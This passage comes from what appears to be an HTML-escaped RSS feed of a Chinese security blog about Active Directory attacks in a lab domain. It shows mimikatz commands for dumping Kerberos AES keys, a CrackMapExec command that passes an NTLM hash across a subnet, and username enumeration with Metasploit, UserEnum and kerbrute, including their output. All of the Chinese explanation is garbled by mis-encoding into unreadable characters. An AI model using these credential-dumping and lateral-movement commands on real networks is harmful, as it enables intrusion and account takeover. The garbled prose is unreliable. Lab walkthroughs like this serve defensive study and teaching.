&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;aes keyçš„è·å–æ–¹å¼:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;privilege::debug 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sekurlsa::ekeys
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æµ‹è¯•æ²¡æœ‰è¡¥ä¸çš„æƒ…å†µä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/17.png&#34; alt=&#34;17&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¡¥ä¸å¯ä»¥ä»è¿™é‡Œä¸‹è½½&lt;a href=&#34;http://support.microsoft.com/en-us/help/2871997&#34;&gt;2871997&lt;/a&gt;ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æ³¨æ„è¿™ä¸ªè¡¥ä¸æ˜¯å®‰è£…åœ¨æœ¬åœ°çš„&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æˆ‘ä»¬åœ¨æœ‰è¡¥ä¸æµ‹è¯•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/13.png&#34; alt=&#34;13&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹å‡ºæ¥å¥½åƒå¹¶ä¸æ˜¯å› ä¸ºæœ‰è¿™ä¸ªè¡¥ä¸è€Œå¯¼è‡´aes key,çœ‹ä¸Šé¢çš„æ–‡ç« æœ‰æ€»ç»“åˆ°aes keyçš„åœ°æ–¹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â€œå—ä¿æŠ¤çš„ç”¨æˆ·â€ç»„æ”¯æŒï¼ˆå¼ºåˆ¶Kerberosèº«ä»½éªŒè¯ä»¥å®æ–½AESåŠ å¯†ï¼‰
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1.å½“â€œåŸŸåŠŸèƒ½çº§åˆ«â€è®¾ç½®ä¸ºWindows Server 2012 R2æ—¶ï¼Œå°†åˆ›å»ºâ€œå—ä¿æŠ¤çš„ç”¨æˆ·â€ç»„ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2.å—ä¿æŠ¤çš„ç”¨æˆ·ç»„ä¸­çš„å¸æˆ·åªèƒ½ä½¿ç”¨Kerberosåè®®è¿›è¡Œèº«ä»½éªŒè¯ï¼Œæ‹’ç»NTLMï¼Œæ‘˜è¦å¼èº«ä»½éªŒè¯å’ŒCredSSPã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;3.Kerberosæ‹’ç»DESå’ŒRC4åŠ å¯†ç±»å‹è¿›è¡Œé¢„èº«ä»½éªŒè¯-å¿…é¡»å°†åŸŸé…ç½®ä¸ºæ”¯æŒAESæˆ–æ›´é«˜ç‰ˆæœ¬ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;4.ä¸èƒ½ä½¿ç”¨Kerberosçº¦æŸæˆ–ä¸å—çº¦æŸçš„å§”æ‰˜æ¥å§”æ‰˜å—ä¿æŠ¤ç”¨æˆ·çš„å¸æˆ·ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;5.å—ä¿æŠ¤çš„ç”¨æˆ·å¯ä»¥ä½¿ç”¨â€œèº«ä»½éªŒè¯ç­–ç•¥â€å¾ˆå¥½åœ°å·¥ä½œã€‚
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ‰€ä»¥å½’çº³æ€»ç»“ï¼š&lt;strong&gt;Pass the keyå°±æ˜¯ä½¿ç”¨AES256æˆ–è€…AES128çš„æ–¹å¼è¿›è¡Œä¼ é€’ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;pthæ‰¹é‡æ¨ªå‘ç§»åŠ¨&#34;&gt;pthæ‰¹é‡æ¨ªå‘ç§»åŠ¨&lt;/h2&gt;
&lt;h3 id=&#34;crackmapexec-2&#34;&gt;CrackMapExec&lt;/h3&gt;
&lt;p&gt;CrackMapExecé›†æˆäº†wmiexecã€atexeã€smbexecçš„æ–¹å¼,é›†æˆäº†smbæ‰«æ,å£ä»¤çˆ†ç ´ç­‰åŠŸèƒ½,éå¸¸é€‚åˆæ‹¿æ¥å¿«é€Ÿç§»åŠ¨ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥æ‰«æå†…ç½‘ä¸­çš„445ç«¯å£å¼€æ”¾æƒ…å†µï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;crackmapexec smb 172.16.0.100/24
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/19.png&#34; alt=&#34;19&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨æ‰¹é‡ä¼ é€’hashçš„å‘½ä»¤ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;crackmapexec smb 172.16.0.100/24 -u testuser -H de26cce0356891a4a020e7c4957afc72 -d hack.lab
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;å› ä¸ºæˆ‘è¿™ä¸ªæ˜¯åŸŸç®¡ç†è´¦æˆ·ï¼Œæ‰€ä»¥éƒ½èƒ½ç™»å½•ï¼Œ(Pwn3d!ä»£è¡¨ç”¨æˆ·åå’Œhashæ­£ç¡®)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/20.png&#34; alt=&#34;20&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;cobalt-strike-1&#34;&gt;Cobalt Strike&lt;/h3&gt;
&lt;p&gt;cså¤§å®¶åº”è¯¥å¾ˆç†Ÿæ‚‰äº†ï¼Œè¿™å—æˆ‘æ²¡æ­ç¯å¢ƒï¼Œä¸»è¦æ˜¯åœ¨ç›®æ ‡(target)å½“ä¸­é€‰ä¸­ç›®æ ‡å³é”®é€‰æ‹©è¦pthçš„æ–¹å¼å³å¯ã€‚&lt;/p&gt;
&lt;h1 id=&#34;0x03-å‚è€ƒ&#34;&gt;0x03 å‚è€ƒ&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/9309&#34;&gt;https://xz.aliyun.com/t/9309&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://drops.xmd5.com/static/drops/tips-11631.html&#34;&gt;http://drops.xmd5.com/static/drops/tips-11631.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/193150&#34;&gt;https://www.anquanke.com/post/id/193150&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/8117&#34;&gt;https://xz.aliyun.com/t/8117&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0&#34;&gt;https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/193149&#34;&gt;https://www.anquanke.com/post/id/193149&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&amp;hellip;&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>åŸŸæ¸—é€-ç”¨æˆ·åæšä¸¾</title>
      <link>https://xxe.icu/kerberos_user_enumerate.html</link>
      <pubDate>Mon, 21 Feb 2022 11:04:34 +0800</pubDate>
      
      <guid>https://xxe.icu/kerberos_user_enumerate.html</guid>
      
        <description>&lt;h1 id=&#34;0x00-ç®€ä»‹&#34;&gt;0x00 ç®€ä»‹&lt;/h1&gt;
&lt;p&gt;åœ¨ä¹‹å‰çš„ä¸€ç¼–&lt;a href=&#34;https://xxe.icu/posts/kerberos_authentication/&#34;&gt;åŸŸæ¸—é€-Kerberosè®¤è¯&lt;/a&gt;æ–‡ç« ä¸­å·²ç»å†™è¿‡kerberosçš„è®¤è¯è¿‡ç¨‹ï¼Œè¿™æ¬¡å†™çš„æ˜¯å¦‚ä½•å»æšä¸¾åŸŸä¸­çš„ç”¨æˆ·åï¼Œå¾—åˆ°ç”¨æˆ·ååæˆ‘ä»¬æ‰å¯ä»¥åšä¸‹ä¸€æ­¥çš„æ“ä½œï¼Œæ¯”å¦‚å¯†ç å–·æ´’ç­‰ã€‚&lt;/p&gt;
&lt;h1 id=&#34;0x01-è®¤è¯è¿‡ç¨‹åˆ†æ&#34;&gt;0x01 è®¤è¯è¿‡ç¨‹åˆ†æ&lt;/h1&gt;
&lt;p&gt;å¯¹äºç”¨æˆ·åæšä¸¾éœ€è¦å¯¹æ ¹æ®ä»¥ä¸‹é”™è¯¯ä¿¡æ¯æ¥è¾¨åˆ«ç”¨æˆ·åæ˜¯å¦æ­£ç¡®ï¼š&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ç”¨æˆ·çŠ¶æ€&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;Kerberos é”™è¯¯ä¿¡æ¯&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;ç”¨æˆ·å¯ç”¨&lt;/td&gt;
&lt;td&gt;KDC_ERR_PREAUTH_REQUIRED&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ç”¨æˆ·é”å®š&lt;/td&gt;
&lt;td&gt;KDC_ERR_CLIENT_REVOKED&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ç”¨æˆ·ä¸å­˜åœ¨&lt;/td&gt;
&lt;td&gt;KDC_ERR_C_PRINCIPAL_UNKNOWN&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;æˆ‘ä»¬æ¥çœ‹ä¸‹ç”¨æˆ·ä¸å­˜åœ¨çš„AS_REQåŒ…ï¼Œä¸»è¦æ˜¯åœ¨cnameçš„å‚æ•°é‡Œé¢è®¾ç½®ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Kerberos_user_enumerate//1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿”å›äº†ä¸€ä¸ªPRINCIPAL_UNKNOWN é”™è¯¯çš„åŒ…ï¼Œï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Kerberos_user_enumerate//2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;é‚£å¦‚æœæ˜¯ç”¨æˆ·åæ­£ç¡®ï¼Œå¯†ç ä¸æ­£ç¡®çš„åŒ…å‘¢ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Kerberos_user_enumerate//4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;0x02-å®æˆ˜&#34;&gt;0x02 å®æˆ˜&lt;/h1&gt;
&lt;p&gt;ä»ä¸Šé¢æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œé€šè¿‡è¿”å›ä¸åŒçš„é”™è¯¯ä¿¡æ¯å°±å¯ä»¥çŸ¥é“æ˜¯å¦å­˜åœ¨æ­£ç¡®çš„ç”¨æˆ·åï¼Œä¸‹é¢æˆ‘ä»¬æ¥é€šè¿‡å‡ æ¬¾æšä¸¾çš„å·¥å…·è¿›è¡Œå®æˆ˜ã€‚&lt;/p&gt;
&lt;h2 id=&#34;metasploit&#34;&gt;Metasploit&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;aduser.txt&lt;/code&gt;æ–‡ä»¶æ˜¯ç”¨æˆ·ååˆ—è¡¨æ–‡ä»¶ï¼Œéœ€è¦è®¾ç½®åŸŸæ§IPåœ°å€ã€åŸŸåä¿¡æ¯&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 &amp;gt; use auxiliary/gather/kerberos_enumusers
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 auxiliary(gather/kerberos_enumusers) &amp;gt; show options
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Module options (auxiliary/gather/kerberos_enumusers):
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Name       Current Setting  Required  Description
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ----       ---------------  --------  -----------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   DOMAIN                      yes       The Domain Eg: demo.local
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   RPORT      88               yes       The target port
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Timeout    10               yes       The TCP timeout to establish connection and read data
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   USER_FILE                   yes       Files containing usernames, one per line
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 auxiliary(gather/kerberos_enumusers) &amp;gt; set rhosts 172.16.0.106
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rhosts =&amp;gt; 172.16.0.106
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 auxiliary(gather/kerberos_enumusers) &amp;gt; set user_file ~/aduser.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user_file =&amp;gt; ~/aduser.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 auxiliary(gather/kerberos_enumusers) &amp;gt; set domain hack.lab
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;domain =&amp;gt; hack.lab
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 auxiliary(gather/kerberos_enumusers) &amp;gt; exploit 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸‹é¢å¯ä»¥çŸ¥é“æšä¸¾å‡ºå­˜åœ¨çš„åŸŸç”¨æˆ·ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Kerberos_user_enumerate//5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;åœ¨è¿è¡Œå®Œæˆä¹‹åä¼šå°†ç»“æœä¿å­˜åœ¨ metasploit çš„æ•°æ®åº“ä¸­ï¼Œè¾“å…¥å‘½ä»¤ &lt;code&gt;creds&lt;/code&gt;å³å¯æŸ¥çœ‹å­˜åœ¨çš„ç”¨æˆ·ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;è¿™é‡Œè¦æ³¨æ„å¦‚æœå­˜åœ¨AS-REPRoastingæ¼æ´çš„ç”¨æˆ·ä¼šå‡ºç°æŠ¥é”™&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;userenum&#34;&gt;UserEnum&lt;/h2&gt;
&lt;p&gt;è¿™ä¸ªé¡¹ç›®æä¾›äº†ä¸‰ä¸ªè„šæœ¬ï¼Œåˆ†åˆ«æ˜¯ä½¿ç”¨DsrGetDcNameEx2,CLDAP pingå’ŒNetBIOS MailSlot pingä¸‰ç§æ–¹æ³•å»æšä¸¾ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹è½½ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/sensepost/UserEnum.git
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿›å…¥ç›®å½•å®‰è£…ä¸€ä¸‹æ¨¡å—ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python2 -m pip install -r requirements.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™é‡Œå¦‚æœè¿˜æ˜¯æŠ¥é”™è®°å¾—å®‰è£…ä¸‹é¢çš„ç‰ˆæœ¬ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python2 -m pip install &lt;span class=&#34;nv&#34;&gt;asn1tools&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;0.100.0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¡«å†™çˆ†ç ´ä¿¡æ¯ï¼Œå¼€å§‹æ‰§è¡Œè„šæœ¬ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python2 UserEnum_LDAP.py 172.16.0.106 hack.lab ~/aduser.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¼šæ˜¾ç¤ºå‡ºçˆ†ç ´å‡ºçš„åŸŸç”¨æˆ·ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Kerberos_user_enumerate//6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;kerbrutego&#34;&gt;Kerbruteï¼ˆGoï¼‰&lt;/h2&gt;
&lt;p&gt;Kerbruteä¼šå‘é€æ²¡æœ‰é¢„è®¤è¯çš„TGTè¯·æ±‚ã€‚å¦‚æœKDCå“åº”ä¸»æœ¬æ–‡æœªçŸ¥é”™è¯¯ï¼Œåˆ™ä¸å­˜åœ¨ç”¨æˆ·åã€‚ä½†æ˜¯ï¼Œå¦‚æœKDCæç¤ºé¢„å…ˆéªŒè¯ï¼Œæˆ‘ä»¬çŸ¥é“ç”¨æˆ·åå­˜åœ¨ï¼Œæˆ‘ä»¬ç»§ç»­ã€‚è¿™ä¸ä¼šå¯¼è‡´ä»»ä½•ç™»å½•å¤±è´¥ï¼Œå› æ­¤å®ƒä¸ä¼šé”å®šä»»ä½•å¸æˆ·ã€‚å¦‚æœå¯ç”¨äº†Kerberosæ—¥å¿—è®°å½•ï¼Œåˆ™ä¼šç”ŸæˆWindowsäº‹ä»¶ID 4768ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹è½½åœ°å€ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/ropnop/kerbrute/releases/tag/v1.0.3&#34;&gt;https://github.com/ropnop/kerbrute/releases/tag/v1.0.3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å› ä¸ºæˆ‘çš„æ˜¯kaliï¼Œæ‰€ä»¥é€‰æ‹© &lt;a href=&#34;https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64&#34;&gt;kerbrute_linux_amd64&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä¸‹é¢å¡«å†™åŸŸåå’Œæ–‡ä»¶ä¿¡æ¯å³å¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;oscpã‰¿oscp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/tools/windows&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ ./kerbrute_linux_amd64 userenum -d hack.lab ~/aduser.txt --dc 172.16.0.106 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    __             __               __     
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   / /_____  _____/ /_  _______  __/ /____ 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  / //_/ _ &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; ___/ __ &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; ___/ / / / __/ _ &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt; / ,&amp;lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/_/&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;__/_/  /_.___/_/   &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_,_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;__/                                        
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Version: v1.0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;9dad6e1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; - 02/21/22 - Ronnie Flathers @ropnop
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2022/02/21 21:21:28 &amp;gt;  Using KDC&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2022/02/21 21:21:28 &amp;gt;   172.16.0.106:88
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2022/02/21 21:21:28 &amp;gt;  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; VALID USERNAME:       lucky@hack.lab
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2022/02/21 21:21:28 &amp;gt;  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; VALID USERNAME:       testuser@hack.lab
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2022/02/21 21:21:28 &amp;gt;  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; VALID USERNAME:       testsql@hack.lab
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2022/02/21 21:21:28 &amp;gt;  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; VALID USERNAME:       administrator@hack.lab
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2022/02/21 21:21:28 &amp;gt;  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; VALID USERNAME:       sqlsql@hack.lab
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2022/02/21 21:21:28 &amp;gt;  Done! Tested &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; usernames &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; valid&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; in 0.010 seconds
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;kerbrutepython&#34;&gt;kerbruteï¼ˆPythonï¼‰&lt;/h2&gt;
